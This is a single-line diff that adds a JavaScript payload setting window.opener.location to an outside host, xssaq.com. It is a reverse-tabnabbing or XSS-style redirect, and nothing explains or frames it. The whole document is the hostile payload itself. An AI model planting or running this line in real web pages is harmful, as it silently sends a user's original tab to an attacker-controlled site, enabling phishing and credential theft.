@@ -1,0 +1,1 @@
+window.opener.location="http://xssaq.com/";void(0);
